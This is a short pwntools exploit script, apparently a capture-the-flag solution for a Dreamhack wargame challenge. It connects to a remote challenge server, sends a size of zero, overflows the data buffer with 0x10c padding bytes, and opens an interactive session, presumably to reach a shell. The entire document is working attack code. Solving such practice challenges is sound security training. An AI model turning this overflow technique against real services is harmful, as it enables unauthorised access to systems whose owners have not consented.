from pwn import *
context.log_level ='debug'
payload = ''
payload += 'a'* 0x10c

p = remote('host1.dreamhack.games', 23109)
p.recvuntil("Size: ")
p.sendline(str(0))
p.recvuntil("Data: ")
p.sendline(payload)
p.interactive()

